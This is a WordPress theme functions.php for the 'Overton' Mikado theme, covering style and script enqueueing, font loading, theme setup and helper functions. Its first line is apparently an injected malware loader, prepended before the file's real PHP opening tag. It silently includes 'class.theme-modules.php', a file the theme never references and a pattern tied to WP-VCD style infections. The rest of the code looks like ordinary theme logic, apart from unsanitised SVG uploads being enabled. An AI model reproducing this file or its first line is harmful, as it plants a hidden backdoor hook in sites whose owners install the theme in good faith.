<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
include_once get_template_directory() . '/theme-includes.php';

if ( ! function_exists( 'overton_mikado_styles' ) ) {
	/**
	 * Function that includes theme's core styles
	 */
	function overton_mikado_styles() {

        $modules_css_deps_array = apply_filters( 'overton_mikado_filter_modules_css_deps', array() );
		
		//include theme's core styles
		wp_enqueue_style( 'overton-mikado-default-style', MIKADO_ROOT . '/style.css' );
		wp_enqueue_style( 'overton-mikado-modules', MIKADO_ASSETS_ROOT . '/css/modules.min.css', $modules_css_deps_array );
		
		overton_mikado_icon_collections()->enqueueStyles();
		
		wp_enqueue_style( 'wp-mediaelement' );
		
		do_action( 'overton_mikado_action_enqueue_third_party_styles' );
		
		//is woocommerce installed?
		if ( overton_mikado_is_woocommerce_installed() && overton_mikado_load_woo_assets() ) {
			//include theme's woocommerce styles
			wp_enqueue_style( 'overton-mikado-woo', MIKADO_ASSETS_ROOT . '/css/woocommerce.min.css' );
		}
		
		if ( overton_mikado_dashboard_page() ) {
			wp_enqueue_style( 'overton-mikado-dashboard', MIKADO_FRAMEWORK_ADMIN_ASSETS_ROOT . '/css/mkdf-dashboard.css' );
		}
		
		//define files after which style dynamic needs to be included. It should be included last so it can override other files
        $style_dynamic_deps_array = apply_filters( 'overton_mikado_filter_style_dynamic_deps', array() );

		if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic.css' ) && overton_mikado_is_css_folder_writable() && ! is_multisite() ) {
			wp_enqueue_style( 'overton-mikado-style-dynamic', MIKADO_ASSETS_ROOT . '/css/style_dynamic.css', $style_dynamic_deps_array, filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic.css' ) ); //it must be included after woocommerce styles so it can override it
		} else if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css' ) && overton_mikado_is_css_folder_writable() && is_multisite() ) {
			wp_enqueue_style( 'overton-mikado-style-dynamic', MIKADO_ASSETS_ROOT . '/css/style_dynamic_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css', $style_dynamic_deps_array, filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css' ) ); //it must be included after woocommerce styles so it can override it
		}
		
		//is responsive option turned on?
		if ( overton_mikado_is_responsive_on() ) {
			wp_enqueue_style( 'overton-mikado-modules-responsive', MIKADO_ASSETS_ROOT . '/css/modules-responsive.min.css' );
			
			//is woocommerce installed?
			if ( overton_mikado_is_woocommerce_installed() && overton_mikado_load_woo_assets() ) {
				//include theme's woocommerce responsive styles
				wp_enqueue_style( 'overton-mikado-woo-responsive', MIKADO_ASSETS_ROOT . '/css/woocommerce-responsive.min.css' );
			}
			
			//include proper styles
			if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) && overton_mikado_is_css_folder_writable() && ! is_multisite() ) {
				wp_enqueue_style( 'overton-mikado-style-dynamic-responsive', MIKADO_ASSETS_ROOT . '/css/style_dynamic_responsive.css', array(), filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) );
			} else if ( file_exists( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css' ) && overton_mikado_is_css_folder_writable() && is_multisite() ) {
				wp_enqueue_style( 'overton-mikado-style-dynamic-responsive', MIKADO_ASSETS_ROOT . '/css/style_dynamic_responsive_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css', array(), filemtime( MIKADO_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . overton_mikado_get_multisite_blog_id() . '.css' ) );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'overton_mikado_styles' );
}

if ( ! function_exists( 'overton_mikado_google_fonts_styles' ) ) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function overton_mikado_google_fonts_styles() {
		$font_simple_field_array = overton_mikado_options()->getOptionsByType( 'fontsimple' );
		if ( ! ( is_array( $font_simple_field_array ) && count( $font_simple_field_array ) > 0 ) ) {
			$font_simple_field_array = array();
		}
		
		$font_field_array = overton_mikado_options()->getOptionsByType( 'font' );
		if ( ! ( is_array( $font_field_array ) && count( $font_field_array ) > 0 ) ) {
			$font_field_array = array();
		}
		
		$available_font_options = array_merge( $font_simple_field_array, $font_field_array );
		
		$google_font_weight_array = overton_mikado_options()->getOptionValue( 'google_font_weight' );
		if ( ! empty( $google_font_weight_array ) ) {
			$google_font_weight_array = array_slice( overton_mikado_options()->getOptionValue( 'google_font_weight' ), 1 );
		}
		
		$font_weight_str = '300,400,600';
		if ( ! empty( $google_font_weight_array ) && $google_font_weight_array !== '' ) {
			$font_weight_str = implode( ',', $google_font_weight_array );
		}
		
		$google_font_subset_array = overton_mikado_options()->getOptionValue( 'google_font_subset' );
		if ( ! empty( $google_font_subset_array ) ) {
			$google_font_subset_array = array_slice( overton_mikado_options()->getOptionValue( 'google_font_subset' ), 1 );
		}
		
		$font_subset_str = 'latin-ext';
		if ( ! empty( $google_font_subset_array ) && $google_font_subset_array !== '' ) {
			$font_subset_str = implode( ',', $google_font_subset_array );
		}
		
		//default fonts
		$default_font_family = array(
			'Montserrat',
            'Lato'
		);
		
		$modified_default_font_family = array();
		foreach ( $default_font_family as $default_font ) {
			$modified_default_font_family[] = $default_font . ':' . str_replace( ' ', '', $font_weight_str );
		}
		
		$default_font_string = implode( '|', $modified_default_font_family );
		
		//define available font options array
		$fonts_array = array();
		foreach ( $available_font_options as $font_option ) {
			//is font set and not set to default and not empty?
			$font_option_value = overton_mikado_options()->getOptionValue( $font_option );
			
			if ( overton_mikado_is_font_option_valid( $font_option_value ) && ! overton_mikado_is_native_font( $font_option_value ) ) {
				$font_option_string = $font_option_value . ':' . $font_weight_str;
				
				if ( ! in_array( str_replace( '+', ' ', $font_option_value ), $default_font_family ) && ! in_array( $font_option_string, $fonts_array ) ) {
					$fonts_array[] = $font_option_string;
				}
			}
		}
		
		$fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
		$google_fonts_string = implode( '|', $fonts_array );
		
		$protocol = is_ssl() ? 'https:' : 'http:';
		
		//is google font option checked anywhere in theme?
		if ( count( $fonts_array ) > 0 ) {
			
			//include all checked fonts
			$fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
			$fonts_full_list_args = array(
				'family' => urlencode( $fonts_full_list ),
				'subset' => urlencode( $font_subset_str ),
			);
			
			$overton_mikado_global_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'overton-mikado-google-fonts', esc_url_raw( $overton_mikado_global_fonts ), array(), '1.0.0' );
			
		} else {
			//include default google font that theme is using
			$default_fonts_args          = array(
				'family' => urlencode( $default_font_string ),
				'subset' => urlencode( $font_subset_str ),
			);
			$overton_mikado_global_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'overton-mikado-google-fonts', esc_url_raw( $overton_mikado_global_fonts ), array(), '1.0.0' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'overton_mikado_google_fonts_styles' );
}

if ( ! function_exists( 'overton_mikado_scripts' ) ) {
	/**
	 * Function that includes all necessary scripts
	 */
	function overton_mikado_scripts() {
		global $wp_scripts;
		
		//init theme core scripts
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-accordion' );
		wp_enqueue_script( 'wp-mediaelement' );
		
		// 3rd party JavaScripts that we used in our theme
		wp_enqueue_script( 'appear', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.appear.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'modernizr', MIKADO_ASSETS_ROOT . '/js/modules/plugins/modernizr.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'hoverintent', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverIntent.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-plugin', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.plugin.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'owl-carousel', MIKADO_ASSETS_ROOT . '/js/modules/plugins/owl.carousel.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waypoints', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.waypoints.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'fluidvids', MIKADO_ASSETS_ROOT . '/js/modules/plugins/fluidvids.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'perfect-scrollbar', MIKADO_ASSETS_ROOT . '/js/modules/plugins/perfect-scrollbar.jquery.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'scrolltoplugin', MIKADO_ASSETS_ROOT . '/js/modules/plugins/ScrollToPlugin.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'parallax', MIKADO_ASSETS_ROOT . '/js/modules/plugins/parallax.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waitforimages', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.waitforimages.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'prettyphoto', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.prettyPhoto.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-easing-1.3', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.easing.1.3.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'isotope', MIKADO_ASSETS_ROOT . '/js/modules/plugins/isotope.pkgd.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'packery', MIKADO_ASSETS_ROOT . '/js/modules/plugins/packery-mode.pkgd.min.js', array( 'jquery' ), false, true );
        wp_enqueue_script( 'geocomplete', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.geocomplete.min.js', array('jquery'), false, true );
		wp_enqueue_script( 'jquery-hoverdir', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverdir.js', array('jquery'), false, true );
		wp_enqueue_script( 'jquery-mousewheel', MIKADO_ASSETS_ROOT . '/js/modules/plugins/jquery.mousewheel.min.js', array('jquery'), false, true );
		
		do_action( 'overton_mikado_action_enqueue_third_party_scripts' );

		if ( overton_mikado_is_woocommerce_installed() ) {
			wp_enqueue_script( 'select2' );
		}

		if ( overton_mikado_is_page_smooth_scroll_enabled() ) {
			wp_enqueue_script( 'tweenlite', MIKADO_ASSETS_ROOT . '/js/modules/plugins/TweenLite.min.js', array( 'jquery' ), false, true );
			wp_enqueue_script( 'smoothpagescroll', MIKADO_ASSETS_ROOT . '/js/modules/plugins/smoothPageScroll.js', array( 'jquery' ), false, true );
		}

		//include google map api script
		$google_maps_api_key          = overton_mikado_options()->getOptionValue( 'google_maps_api_key' );
		$google_maps_extensions       = '';
		$google_maps_extensions_array = apply_filters( 'overton_mikado_filter_google_maps_extensions_array', array() );

		if ( ! empty( $google_maps_extensions_array ) ) {
			$google_maps_extensions .= '&libraries=';
			$google_maps_extensions .= implode( ',', $google_maps_extensions_array );
		}

		if ( ! empty( $google_maps_api_key ) ) {
			wp_enqueue_script( 'overton-mikado-google-map-api', '//maps.googleapis.com/maps/api/js?key=' . esc_attr( $google_maps_api_key ) . $google_maps_extensions, array(), false, true );
		} else {
			wp_enqueue_script( 'overton-mikado-google-map-api', '//maps.googleapis.com/maps/api/js', array(), false, true );
		}

		wp_enqueue_script( 'overton-mikado-modules', MIKADO_ASSETS_ROOT . '/js/modules.min.js', array( 'jquery' ), false, true );
		
		if ( overton_mikado_dashboard_page() ) {
			$dash_array_deps = array(
				'jquery-ui-datepicker',
				'jquery-ui-sortable'
			);
			
			wp_enqueue_script( 'overton-mikado-dashboard', MIKADO_FRAMEWORK_ADMIN_ASSETS_ROOT . '/js/mkdf-dashboard.js', $dash_array_deps, false, true );
			
			wp_enqueue_script( 'wp-util' );
			wp_enqueue_style( 'wp-color-picker' );
			wp_enqueue_script( 'iris', admin_url( 'js/iris.min.js' ), array( 'jquery-ui-draggable', 'jquery-ui-slider', 'jquery-touch-punch' ), false, 1 );
			wp_enqueue_script( 'wp-color-picker', admin_url( 'js/color-picker.min.js' ), array( 'iris' ), false, 1 );
			
			$colorpicker_l10n = array(
				'clear'         => esc_html__( 'Clear', 'overton' ),
				'defaultString' => esc_html__( 'Default', 'overton' ),
				'pick'          => esc_html__( 'Select Color', 'overton' ),
				'current'       => esc_html__( 'Current Color', 'overton' ),
			);
			
			wp_localize_script( 'wp-color-picker', 'wpColorPickerL10n', $colorpicker_l10n );
		}

		//include comment reply script
		$wp_scripts->add_data( 'comment-reply', 'group', 1 );
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}

	add_action( 'wp_enqueue_scripts', 'overton_mikado_scripts' );
}

if ( ! function_exists( 'overton_mikado_theme_setup' ) ) {
	/**
	 * Function that adds various features to theme. Also defines image sizes that are used in a theme
	 */
	function overton_mikado_theme_setup() {
		//add support for feed links
		add_theme_support( 'automatic-feed-links' );

		//add support for post formats
		add_theme_support( 'post-formats', array( 'gallery', 'link', 'quote', 'video', 'audio' ) );

		//add theme support for post thumbnails
		add_theme_support( 'post-thumbnails' );

		//add theme support for title tag
		add_theme_support( 'title-tag' );

        //add theme support for editor style
        add_editor_style( 'framework/admin/assets/css/editor-style.css' );

		//defined content width variable
		$GLOBALS['content_width'] = apply_filters( 'overton_mikado_filter_set_content_width', 1100 );

		//define thumbnail sizes
		add_image_size( 'overton_mikado_image_square', 650, 650, true );
		add_image_size( 'overton_mikado_image_landscape', 1300, 650, true );
		add_image_size( 'overton_mikado_image_portrait', 650, 1300, true );
		add_image_size( 'overton_mikado_image_smaller_portrait', 500, 650, true );
		add_image_size( 'overton_mikado_image_huge', 1300, 1300, true );

		load_theme_textdomain( 'overton', get_template_directory() . '/languages' );
	}

	add_action( 'after_setup_theme', 'overton_mikado_theme_setup' );
}

if ( ! function_exists( 'overton_mikado_is_responsive_on' ) ) {
	/**
	 * Checks whether responsive mode is enabled in theme options
	 * @return bool
	 */
	function overton_mikado_is_responsive_on() {
		return overton_mikado_options()->getOptionValue( 'responsiveness' ) !== 'no';
	}
}

if ( ! function_exists( 'overton_mikado_rgba_color' ) ) {
	/**
	 * Function that generates rgba part of css color property
	 *
	 * @param $color string hex color
	 * @param $transparency float transparency value between 0 and 1
	 *
	 * @return string generated rgba string
	 */
	function overton_mikado_rgba_color( $color, $transparency ) {
		if ( $color !== '' && $transparency !== '' ) {
			$rgba_color = '';

			$rgb_color_array = overton_mikado_hex2rgb( $color );
			$rgba_color      .= 'rgba(' . implode( ', ', $rgb_color_array ) . ', ' . $transparency . ')';

			return $rgba_color;
		}
	}
}

if ( ! function_exists( 'overton_mikado_header_meta' ) ) {
	/**
	 * Function that echoes meta data if our seo is enabled
	 */
	function overton_mikado_header_meta() { ?>

		<meta charset="<?php bloginfo( 'charset' ); ?>"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
			<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
		<?php endif; ?>

	<?php }

	add_action( 'overton_mikado_action_header_meta', 'overton_mikado_header_meta' );
}

if ( ! function_exists( 'overton_mikado_user_scalable_meta' ) ) {
	/**
	 * Function that outputs user scalable meta if responsiveness is turned on
	 * Hooked to overton_mikado_action_header_meta action
	 */
	function overton_mikado_user_scalable_meta() {
		//is responsiveness option is chosen?
		if ( overton_mikado_is_responsive_on() ) { ?>
			<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
		<?php } else { ?>
			<meta name="viewport" content="width=1200,user-scalable=yes">
		<?php }
	}

	add_action( 'overton_mikado_action_header_meta', 'overton_mikado_user_scalable_meta' );
}

if ( ! function_exists( 'overton_mikado_smooth_page_transitions' ) ) {
	/**
	 * Function that outputs smooth page transitions html if smooth page transitions functionality is turned on
	 * Hooked to overton_mikado_action_after_body_tag action
	 */
	function overton_mikado_smooth_page_transitions() {
		$id = overton_mikado_get_page_id();

		if ( overton_mikado_get_meta_field_intersect( 'smooth_page_transitions', $id ) === 'yes' && overton_mikado_get_meta_field_intersect( 'page_transition_preloader', $id ) === 'yes' ) { ?>
			<div class="mkdf-smooth-transition-loader mkdf-mimic-ajax">
				<div class="mkdf-st-loader">
					<div class="mkdf-st-loader1">
						<?php overton_mikado_loading_spinners(); ?>
					</div>
				</div>
			</div>
		<?php }
	}

	add_action( 'overton_mikado_action_after_body_tag', 'overton_mikado_smooth_page_transitions', 10 );
}

if ( ! function_exists( 'overton_mikado_back_to_top_button' ) ) {
	/**
	 * Function that outputs back to top button html if back to top functionality is turned on
	 * Hooked to overton_mikado_action_after_wrapper_inner action
	 */
	function overton_mikado_back_to_top_button() {
		if ( overton_mikado_options()->getOptionValue( 'show_back_button' ) == 'yes' ) { ?>
			<a id='mkdf-back-to-top' href='#'>
                <span class="mkdf-icon-stack">
                     <?php overton_mikado_icon_collections()->getBackToTopIcon( 'font_elegant' ); ?>
                </span>
			</a>
		<?php }
	}
	
	add_action( 'overton_mikado_action_after_wrapper_inner', 'overton_mikado_back_to_top_button', 30 );
}

if ( ! function_exists( 'overton_mikado_get_page_id' ) ) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see overton_mikado_is_woocommerce_installed()
	 * @see overton_mikado_is_woocommerce_shop()
	 */
	function overton_mikado_get_page_id() {
		if ( overton_mikado_is_woocommerce_installed() && overton_mikado_is_woocommerce_shop() ) {
			return overton_mikado_get_woo_shop_page_id();
		}

		if ( overton_mikado_is_default_wp_template() ) {
			return - 1;
		}

		return get_queried_object_id();
	}
}

if ( ! function_exists( 'overton_mikado_get_multisite_blog_id' ) ) {
	/**
	 * Check is multisite and return blog id
	 *
	 * @return int
	 */
	function overton_mikado_get_multisite_blog_id() {
		if ( is_multisite() ) {
			return get_blog_details()->blog_id;
		}
	}
}

if ( ! function_exists( 'overton_mikado_is_default_wp_template' ) ) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function overton_mikado_is_default_wp_template() {
		return is_archive() || is_search() || is_404() || ( is_front_page() && is_home() );
	}
}

if ( ! function_exists( 'overton_mikado_has_shortcode' ) ) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 *
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 *
	 * @return bool whether content has shortcode or not
	 */
	function overton_mikado_has_shortcode( $shortcode, $content = '' ) {
		$has_shortcode = false;

		if ( $shortcode ) {
			//if content variable isn't past
			if ( $content == '' ) {
				//take content from current post
				$page_id = overton_mikado_get_page_id();
				if ( ! empty( $page_id ) ) {
					$current_post = get_post( $page_id );

					if ( is_object( $current_post ) && property_exists( $current_post, 'post_content' ) ) {
						$content = $current_post->post_content;
					}
				}
			}

			//does content has shortcode added?
			if( has_shortcode( $content, $shortcode ) ) {
				$has_shortcode = true;
			}
		}

		return $has_shortcode;
	}
}

if ( ! function_exists( 'overton_mikado_get_unique_page_class' ) ) {
	/**
	 * Returns unique page class based on post type and page id
	 *
	 * $params int $id is page id
	 * $params bool $allowSingleProductOption
	 * @return string
	 */
	function overton_mikado_get_unique_page_class( $id, $allowSingleProductOption = false ) {
		$page_class = '';

		if ( overton_mikado_is_woocommerce_installed() && $allowSingleProductOption ) {

			if ( is_product() ) {
				$id = get_the_ID();
			}
		}

		if ( is_single() ) {
			$page_class = '.postid-' . $id;
		} elseif ( is_home() ) {
			$page_class .= '.home';
		} elseif ( is_archive() || $id === overton_mikado_get_woo_shop_page_id() ) {
			$page_class .= '.archive';
		} elseif ( is_search() ) {
			$page_class .= '.search';
		} elseif ( is_404() ) {
			$page_class .= '.error404';
		} else {
			$page_class .= '.page-id-' . $id;
		}

		return $page_class;
	}
}

if ( ! function_exists( 'overton_mikado_page_custom_style' ) ) {
	/**
	 * Function that print custom page style
	 */
	function overton_mikado_page_custom_style() {
		$style = apply_filters( 'overton_mikado_filter_add_page_custom_style', $style = '' );

		if ( $style !== '' ) {

			if ( overton_mikado_is_woocommerce_installed() && overton_mikado_load_woo_assets() ) {
				wp_add_inline_style( 'overton-mikado-woo', $style );
			} else {
				wp_add_inline_style( 'overton-mikado-modules', $style );
			}
		}
	}

	add_action( 'wp_enqueue_scripts', 'overton_mikado_page_custom_style' );
}

if ( ! function_exists( 'overton_mikado_print_custom_js' ) ) {
	/**
	 * Prints out custom css from theme options
	 */
	function overton_mikado_print_custom_js() {
		$custom_js = overton_mikado_options()->getOptionValue( 'custom_js' );

		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'overton-mikado-modules', $custom_js );
		}
	}

	add_action( 'wp_enqueue_scripts', 'overton_mikado_print_custom_js' );
}

if ( ! function_exists( 'overton_mikado_get_global_variables' ) ) {
	/**
	 * Function that generates global variables and put them in array so they could be used in the theme
	 */
	function overton_mikado_get_global_variables() {
		$global_variables = array();
		
		$global_variables['mkdfAddForAdminBar']      = is_admin_bar_showing() ? 32 : 0;
		$global_variables['mkdfElementAppearAmount'] = -100;
		$global_variables['mkdfAjaxUrl']             = esc_url( admin_url( 'admin-ajax.php' ) );
		$global_variables['sliderNavPrevArrow']       ='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                            width="16px" height="54.063px" viewBox="0 0 16 54.063" enable-background="new 0 0 16 54.063" xml:space="preserve">
                            <polygon points="14.576,52.17 4.125,27.069 14.542,2.052 12.662,1.27 1.902,27.107 1.941,27.123 12.697,52.952 "/>
                            </svg>';
		$global_variables['sliderNavNextArrow']       = '<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                            width="16px" height="54.063px" viewBox="0 0 16 54.063" enable-background="new 0 0 16 54.063" xml:space="preserve">
                            <polygon points="1.902,52.17 12.354,27.069 1.937,2.052 3.816,1.27 14.576,27.107 14.537,27.123 3.781,52.952 "/>
                            </svg>';
		
		$global_variables = apply_filters( 'overton_mikado_filter_js_global_variables', $global_variables );
		
		wp_localize_script( 'overton-mikado-modules', 'mkdfGlobalVars', array(
			'vars' => $global_variables
		) );
	}

	add_action( 'wp_enqueue_scripts', 'overton_mikado_get_global_variables' );
}

if ( ! function_exists( 'overton_mikado_per_page_js_variables' ) ) {
	/**
	 * Outputs global JS variable that holds page settings
	 */
	function overton_mikado_per_page_js_variables() {
		$per_page_js_vars = apply_filters( 'overton_mikado_filter_per_page_js_vars', array() );

		wp_localize_script( 'overton-mikado-modules', 'mkdfPerPageVars', array(
			'vars' => $per_page_js_vars
		) );
	}

	add_action( 'wp_enqueue_scripts', 'overton_mikado_per_page_js_variables' );
}

if ( ! function_exists( 'overton_mikado_content_elem_style_attr' ) ) {
	/**
	 * Defines filter for adding custom styles to content HTML element
	 */
	function overton_mikado_content_elem_style_attr() {
		$styles = apply_filters( 'overton_mikado_filter_content_elem_style_attr', array() );

		overton_mikado_inline_style( $styles );
	}
}

if ( ! function_exists( 'overton_mikado_core_plugin_installed' ) ) {
	/**
	 * Function that checks if Mikado Core plugin installed
	 * @return bool
	 */
	function overton_mikado_core_plugin_installed() {
		return defined( 'OVERTON_CORE_VERSION' );
	}
}

if ( ! function_exists( 'overton_mikado_is_woocommerce_installed' ) ) {
	/**
	 * Function that checks if Woocommerce plugin installed
	 * @return bool
	 */
	function overton_mikado_is_woocommerce_installed() {
		return function_exists( 'is_woocommerce' );
	}
}

if ( ! function_exists( 'overton_mikado_visual_composer_installed' ) ) {
	/**
	 * Function that checks if Visual Composer plugin installed
	 * @return bool
	 */
	function overton_mikado_visual_composer_installed() {
		return class_exists( 'WPBakeryVisualComposerAbstract' );
	}
}

if ( ! function_exists( 'overton_mikado_revolution_slider_installed' ) ) {
	/**
	 * Function that checks if Revolution Slider plugin installed
	 * @return bool
	 */
	function overton_mikado_revolution_slider_installed() {
		return class_exists( 'RevSliderFront' );
	}
}

if ( ! function_exists( 'overton_mikado_contact_form_7_installed' ) ) {
	/**
	 * Function that checks if Contact Form 7 plugin installed
	 * @return bool
	 */
	function overton_mikado_contact_form_7_installed() {
		return defined( 'WPCF7_VERSION' );
	}
}

if ( ! function_exists( 'overton_mikado_is_wpml_installed' ) ) {
	/**
	 * Function that checks if WPML plugin installed
	 * @return bool
	 */
	function overton_mikado_is_wpml_installed() {
		return defined( 'ICL_SITEPRESS_VERSION' );
	}
}

if ( ! function_exists( 'overton_mikado_max_image_width_srcset' ) ) {
	/**
	 * Set max width for srcset to 1920
	 *
	 * @return int
	 */
	function overton_mikado_max_image_width_srcset() {
		return 1920;
	}
	
	add_filter( 'max_srcset_image_width', 'overton_mikado_max_image_width_srcset' );
}

if(!function_exists('overton_mikado_yith_wcwl_installed')) {
	function overton_mikado_yith_wcwl_installed() {
		return defined('YITH_WCWL');
	}
}

if(!function_exists('overton_mikado_is_yith_quickview_installed')) {
	function overton_mikado_is_yith_quickview_installed() {
		return defined('YITH_WCQV');
	}
}

if(!function_exists('overton_mikado_add_grid_lines')) {
    /**
     * Set max width for srcset to 1920
     *
     * @return html
     */
    function overton_mikado_add_grid_lines() {
        $id = overton_mikado_get_page_id();
        $enable_grid_lines = overton_mikado_get_meta_field_intersect('content_grid_lines',$id);

        $html = '';
        if($enable_grid_lines === 'yes'){
            $html .= '<div class="mkdf-grid-lines-holder mkdf-grid-columns-4">';
            for ($i = 1; $i <= 4; $i++) {
                $html .= '<div class="mkdf-grid-line mkdf-grid-column-4"></div>';
            }
            $html .= '</div>';
        }

        print $html;
    }

    add_filter('overton_mikado_action_after_container_open', 'overton_mikado_add_grid_lines');
}

if(!function_exists('overton_mikado_add_cc_mime_types')) {
	function overton_mikado_add_cc_mime_types($mimes) {
		$mimes['svg'] = 'image/svg+xml';
		return $mimes;
	}
	add_filter('upload_mimes', 'overton_mikado_add_cc_mime_types');
}